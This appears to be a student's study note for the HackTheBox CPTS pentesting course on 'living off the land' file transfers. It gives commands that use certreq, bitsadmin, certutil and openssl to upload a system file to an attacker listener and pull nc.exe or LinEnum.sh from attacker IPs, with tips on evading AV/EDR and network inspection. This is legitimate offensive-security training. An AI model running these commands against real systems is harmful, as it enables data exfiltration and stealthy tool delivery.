---
title: "Living of the Land"
kind: topic
tags:
  - cpts-hackthebox
area: "CPTS HackTheBox"
up: "[[File Transfers]]"
notion-id: 383759b927518055b8a5d92bc33907d1
---

# Living of the Land

In: [[Career]] / [[CPTS HackTheBox]] / [[File Transfers]]

## Key Concept

Use **binaries already on the system** for file transfers — avoids dropping new tools that trigger AV/EDR.

---

## Reference Sites

- **Windows:** [lolbas-project.github.io](https://lolbas-project.github.io/) → search `/download` or `/upload`
- **Linux:** [gtfobins.github.io](https://gtfobins.github.io/) → search `+file download` or `+file upload`

---

## Windows LOLBins

### 1. certreq.exe (Upload)

```bash
# Target: POST file to attacker's netcat listener
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

# Attacker: catch with netcat
sudo nc -lvnp 8000
```

> [!note]
> File contents arrive in the netcat session as HTTP POST body
>

---

### 2. bitsadmin (Download)

```bash
# CMD
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

# PowerShell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

> [!note]
> BITS = Background Intelligent Transfer Service, minimizes bandwidth impact, blends in with normal Windows activity
>

---

### 3. certutil.exe (Download)

```bash
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

> [!warning]
> **Heavily signatured** — AMSI now flags this as malicious. Use as last resort.
>

---

## Linux GTFOBins

### OpenSSL (Download + Upload — encrypted, "nc style")

```bash
# Attacker: generate cert and start SSL server serving a file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Target: download the file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

> [!note]
> Transfers are **SSL encrypted** — evades network inspection
>

---

## Quick Reference — LOLBins by Function

| Binary | OS | Function | Detected? |
| --- | --- | --- | --- |
| `certreq.exe` | Windows | Upload (POST) | Sometimes |
| `bitsadmin` | Windows | Download | Low |
| `certutil.exe` | Windows | Download | ✅ AMSI flags it |
| `openssl` | Linux | Download + Upload (encrypted) | Low |
| PowerShell BITS | Windows | Download + Upload | Low |

---

## Key Takeaways

- LOLBins = **already trusted by the OS** → lower AV/EDR detection chance
- `certutil` was the go-to Windows wget, but **AMSI now detects it** — avoid unless no other option
- `openssl` on Linux = underrated — provides **encrypted file transfer** without extra tools
- BITS (`bitsadmin`) blends in as legitimate Windows update traffic
- Always **check LOLBAS/GTFOBins first** before dropping custom tools — the more obscure the binary, the less likely it's monitored
- Bookmark both sites and build personal notes — you'll need these under time pressure during real engagements
